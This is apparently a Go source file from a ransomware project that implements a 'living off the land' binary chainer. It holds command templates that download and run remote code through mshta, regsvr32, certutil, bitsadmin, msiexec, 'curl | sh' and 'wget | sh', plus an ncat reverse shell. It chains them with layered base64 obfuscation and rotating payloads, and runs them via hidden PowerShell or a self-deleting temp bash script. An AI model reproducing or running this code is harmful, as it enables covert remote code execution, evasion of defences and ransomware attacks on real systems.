package ransomware

import (
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"math/big"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

type LOLBinEntry struct {
	Name     string
	Bin      string
	Template string
	Risk     int
	OS       string
}

type LOLBinChain struct {
	Steps       []LOLBinEntry
	Encoded     string
	Base64Chain string
	Generated   time.Time
}

type LOLBinChainer struct {
	config    *RansomwareConfig
	lolbins   []LOLBinEntry
	lastChain LOLBinChain
	chains    []LOLBinChain
}

func NewLOLBinChainer(cfg *RansomwareConfig) *LOLBinChainer {
	return &LOLBinChainer{
		config: cfg,
		lolbins: []LOLBinEntry{
			{Name: "MSHTA Remote", Bin: "mshta.exe", Template: `mshta.exe vbscript:Execute("CreateObject(""WScript.Shell"").Run ""%s"",0:close")`, Risk: 3, OS: "windows"},
			{Name: "Rundll32 Load", Bin: "rundll32.exe", Template: `rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";new ActiveXObject('WScript.Shell').Run('%s',0,false)`, Risk: 3, OS: "windows"},
			{Name: "Regsvr32 SCT", Bin: "regsvr32.exe", Template: `regsvr32.exe /s /u /i:http://%s scrobj.dll`, Risk: 4, OS: "windows"},
			{Name: "Certutil Download", Bin: "certutil.exe", Template: `certutil -urlcache -split -f http://%s %TEMP%\payload.dll`, Risk: 2, OS: "windows"},
			{Name: "Bitsadmin Transfer", Bin: "bitsadmin.exe", Template: `bitsadmin /transfer X404X /download /priority FOREGROUND http://%s %TEMP%\stager.exe`, Risk: 2, OS: "windows"},
			{Name: "Cscript XSL", Bin: "cscript.exe", Template: `cscript.exe //Nologo //E:jscript %s`, Risk: 3, OS: "windows"},
			{Name: "Wmic Process Call", Bin: "wmic.exe", Template: `wmic process call create "%s"`, Risk: 1, OS: "windows"},
			{Name: "Msiexec Remote", Bin: "msiexec.exe", Template: `msiexec /quiet /i http://%s`, Risk: 3, OS: "windows"},
			{Name: "Csc Script", Bin: "csc.exe", Template: `csc.exe /out:%TEMP%\agent.exe %s`, Risk: 4, OS: "windows"},
			{Name: "InstallUtil", Bin: "InstallUtil.exe", Template: `InstallUtil.exe /logfile= /LogToConsole=false /U %s`, Risk: 3, OS: "windows"},
			{Name: "Regasm/Regsvcs", Bin: "regasm.exe", Template: `regasm.exe /U %s`, Risk: 3, OS: "windows"},
			{Name: "Msbuild Inline", Bin: "MSBuild.exe", Template: `MSBuild.exe %s`, Risk: 3, OS: "windows"},
			{Name: "Cdb Debugger", Bin: "cdb.exe", Template: `cdb.exe -cf %s -o notepad.exe`, Risk: 4, OS: "windows"},
			{Name: "Dnx Execute", Bin: "dnx.exe", Template: `dnx.exe -p %s`, Risk: 4, OS: "windows"},
			{Name: "Winrm Remote", Bin: "winrm.exe", Template: `winrm invoke Create wmicimv2/Win32_Process @{CommandLine="%s"}`, Risk: 2, OS: "windows"},
			{Name: "Forfiles Spawn", Bin: "forfiles.exe", Template: `forfiles /p c:\windows\system32 /m notepad.exe /c %s`, Risk: 1, OS: "windows"},
			{Name: "Pcalua Shim", Bin: "pcalua.exe", Template: `pcalua.exe -a %s`, Risk: 1, OS: "windows"},
			{Name: "SyncAppvPublishing", Bin: "SyncAppvPublishingServer.exe", Template: `SyncAppvPublishingServer.exe "n;%s"`, Risk: 4, OS: "windows"},
			{Name: "Desktopimgdownldr", Bin: "desktopimgdownldr.exe", Template: `desktopimgdownldr.exe /lockscreenurl:http://%s /eventName:desktop`, Risk: 3, OS: "windows"},
			{Name: "Bash Linux", Bin: "/bin/bash", Template: `bash -c '%s'`, Risk: 1, OS: "linux"},
			{Name: "Python Eval", Bin: "/usr/bin/python3", Template: `python3 -c "%s"`, Risk: 1, OS: "linux"},
			{Name: "Perl Hex", Bin: "/usr/bin/perl", Template: `perl -e '%s'`, Risk: 1, OS: "linux"},
			{Name: "Ruby Eval", Bin: "/usr/bin/ruby", Template: `ruby -e '%s'`, Risk: 1, OS: "linux"},
			{Name: "AWK Sys", Bin: "/usr/bin/awk", Template: `awk 'BEGIN{system("%s")}'`, Risk: 1, OS: "linux"},
			{Name: "Curl Pipe Sh", Bin: "/usr/bin/curl", Template: `curl -s http://%s | sh`, Risk: 1, OS: "linux"},
			{Name: "Wget Sh", Bin: "/usr/bin/wget", Template: `wget -qO- http://%s | sh`, Risk: 1, OS: "linux"},
			{Name: "Ncat E", Bin: "/usr/bin/ncat", Template: `ncat -e /bin/sh %s`, Risk: 1, OS: "linux"},
			{Name: "Strace Proc", Bin: "/usr/bin/strace", Template: `strace -o /dev/null %s`, Risk: 2, OS: "linux"},
		},
	}
}

func (l *LOLBinChainer) FilterByOS() []LOLBinEntry {
	osFilter := "windows"
	if runtime.GOOS == "linux" {
		osFilter = "linux"
	}
	if runtime.GOOS == "darwin" {
		osFilter = "linux"
	}

	var filtered []LOLBinEntry
	for _, lb := range l.lolbins {
		if lb.OS == osFilter || lb.OS == "any" {
			if runtime.GOOS == "windows" {
				sysRoot := os.Getenv("SystemRoot")
				if sysRoot == "" {
					sysRoot = "C:\\Windows"
				}
				binPath := filepath.Join(sysRoot, "System32", lb.Bin)
				if _, err := os.Stat(binPath); err == nil {
					filtered = append(filtered, lb)
				} else if strings.Contains(lb.Bin, "/") {
					filtered = append(filtered, lb)
				} else if lb.Bin == "certutil.exe" || lb.Bin == "bitsadmin.exe" || lb.Bin == "wmic.exe" || lb.Bin == "forfiles.exe" {
					filtered = append(filtered, lb)
				}
			} else {
				if strings.Contains(lb.Bin, "/") {
					if _, err := os.Stat(lb.Bin); err == nil {
						filtered = append(filtered, lb)
					}
				}
			}
		}
	}

	if len(filtered) == 0 {
		filtered = l.lolbins
	}

	return filtered
}

func (l *LOLBinChainer) GenerateChain(payload string, chainSize int) (*LOLBinChain, error) {
	available := l.FilterByOS()
	if len(available) < chainSize {
		chainSize = len(available)
	}
	if chainSize < 1 {
		chainSize = 1
	}

	selected := make(map[string]bool)
	var steps []LOLBinEntry

	for len(steps) < chainSize {
		idx, err := rand.Int(rand.Reader, big.NewInt(int64(len(available))))
		if err != nil {
			idx = big.NewInt(0)
		}
		entry := available[idx.Int64()]
		if !selected[entry.Name] {
			selected[entry.Name] = true
			steps = append(steps, entry)
		}
	}

	currentPayload := payload
	var chainEncoded []string

	for i, step := range steps {
		encoded := strings.NewReplacer(
			"%s", currentPayload,
		).Replace(step.Template)
		chainEncoded = append(chainEncoded, encoded)

		if i < len(steps)-1 {
			currentPayload = encoded
		}
	}

	chainPayload := strings.Join(chainEncoded, " & ")

	base64Chain := base64.StdEncoding.EncodeToString([]byte(chainPayload))
	b64Wrapped := fmt.Sprintf("%s %s %s",
		base64Chain[:len(base64Chain)/3],
		base64Chain[len(base64Chain)/3:2*len(base64Chain)/3],
		base64Chain[2*len(base64Chain)/3:])

	chain := &LOLBinChain{
		Steps:       steps,
		Encoded:     chainPayload,
		Base64Chain: b64Wrapped,
		Generated:   time.Now(),
	}

	l.lastChain = *chain
	l.chains = append(l.chains, *chain)
	if len(l.chains) > 24 {
		l.chains = l.chains[len(l.chains)-24:]
	}

	return chain, nil
}

func (l *LOLBinChainer) ExecuteChain(chain *LOLBinChain) (string, error) {
	if runtime.GOOS == "windows" {
		return l.executeWindowsChain(chain)
	}
	return l.executeLinuxChain(chain)
}

func (l *LOLBinChainer) executeWindowsChain(chain *LOLBinChain) (string, error) {
	encoded := base64.StdEncoding.EncodeToString([]byte(chain.Encoded))

	psScript := fmt.Sprintf(`
$b64 = "%s"
$cmd = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64))
$chunks = $cmd -split '\s*&\s*'
foreach($chunk in $chunks) {
    try {
        $proc = Start-Process -FilePath "cmd.exe" -ArgumentList "/c $chunk" -WindowStyle Hidden -NoNewWindow -PassThru
        Start-Sleep -Milliseconds (500 + (Get-Random -Minimum 100 -Maximum 1500))
    } catch {}
}
Write-Host "LOLBin chain executed: $($chunks.Count) steps"
`, encoded)

	cmd := exec.Command("powershell", "-NoProfile", "-NonInteractive",
		"-WindowStyle", "Hidden", "-Command", psScript)
	out, err := cmd.CombinedOutput()
	return string(out), err
}

func (l *LOLBinChainer) executeLinuxChain(chain *LOLBinChain) (string, error) {
	encoded := base64.StdEncoding.EncodeToString([]byte(chain.Encoded))

	bashScript := fmt.Sprintf(`#!/bin/bash
DECODED=$(echo "%s" | base64 -d 2>/dev/null)
if [ -n "$DECODED" ]; then
    # Split on &
    IFS='&' read -ra STEPS <<< "$DECODED"
    for step in "${STEPS[@]}"; do
        sh -c "$(echo $step)" 2>/dev/null &
        sleep 0.$(($RANDOM %% 2 + 1))
    done
fi
echo "LOLBin chain executed"
`, encoded)

	scriptPath := filepath.Join(os.TempDir(), "x404x_lolbin.sh")
	os.WriteFile(scriptPath, []byte(bashScript), 0755)

	cmd := exec.Command("/bin/bash", scriptPath)
	out, err := cmd.CombinedOutput()
	os.Remove(scriptPath)
	return string(out), err
}

func (l *LOLBinChainer) EncodeMultiLayer(payload string, layers int) string {
	for i := 0; i < layers; i++ {
		payload = base64.StdEncoding.EncodeToString([]byte(payload))
		if i%2 == 0 {
			payload = reverseString(payload)
		}
	}
	return payload
}

func (l *LOLBinChainer) EncodeCompressed(payload string) string {
	b64 := base64.StdEncoding.EncodeToString([]byte(payload))
	chunks := chunkString(b64, 64)
	return strings.Join(chunks, "|")
}

func (l *LOLBinChainer) GenerateRotatingPayload(basePayload string, ttl time.Duration) (func() string, chan struct{}) {
	stop := make(chan struct{})
	var currentChain string

	go func() {
		ticker := time.NewTicker(ttl)
		defer ticker.Stop()

		for {
			select {
			case <-stop:
				return
			case <-ticker.C:
				chain, err := l.GenerateChain(basePayload, l.RandomChainSize(3, 7))
				if err == nil {
					currentChain = chain.Encoded
				}
			}
		}
	}()

	return func() string {
		return currentChain
	}, stop
}

func (l *LOLBinChainer) RandomChainSize(min, max int) int {
	diff := max - min + 1
	n, err := rand.Int(rand.Reader, big.NewInt(int64(diff)))
	if err != nil {
		return min
	}
	return min + int(n.Int64())
}

func (l *LOLBinChainer) GetAvailableLOLBins() []string {
	available := l.FilterByOS()
	var names []string
	for _, lb := range available {
		names = append(names, lb.Name)
	}
	return names
}

func (l *LOLBinChainer) CheckBinaryAvailability() map[string]bool {
	result := make(map[string]bool)
	for _, lb := range l.lolbins {
		if runtime.GOOS == "windows" {
			sysRoot := os.Getenv("SystemRoot")
			if sysRoot == "" {
				sysRoot = "C:\\Windows"
			}
			binPath := filepath.Join(sysRoot, "System32", lb.Bin)
			_, err := os.Stat(binPath)
			result[lb.Name] = err == nil
		} else {
			_, err := os.Stat(lb.Bin)
			result[lb.Name] = err == nil
		}
	}
	return result
}

func reverseString(s string) string {
	runes := []rune(s)
	for i, j := 0, len(runes)-1; i < j; i, j = i+1, j-1 {
		runes[i], runes[j] = runes[j], runes[i]
	}
	return string(runes)
}

func chunkString(s string, chunkSize int) []string {
	if len(s) == 0 {
		return nil
	}
	var chunks []string
	for i := 0; i < len(s); i += chunkSize {
		end := i + chunkSize
		if end > len(s) {
			end = len(s)
		}
		chunks = append(chunks, s[i:end])
	}
	return chunks
}

func (l *LOLBinChainer) FullChainerSuite(payload string) map[string]interface{} {
	result := make(map[string]interface{})

	availableBins := l.FilterByOS()
	result["available_bins"] = len(availableBins)

	chainSize := l.RandomChainSize(3, 6)
	chain, err := l.GenerateChain(payload, chainSize)
	if err != nil {
		result["error"] = err.Error()
		return result
	}

	result["chain_size"] = len(chain.Steps)
	result["encoded_length"] = len(chain.Encoded)
	result["base64_length"] = len(chain.Base64Chain)

	var stepNames []string
	for _, step := range chain.Steps {
		stepNames = append(stepNames, step.Name)
	}
	result["steps"] = stepNames

	multiLayer := l.EncodeMultiLayer(payload, 4)
	result["multi_layer_encoded"] = len(multiLayer)

	result["availability"] = l.CheckBinaryAvailability()

	return result
}

var _ = exec.Command
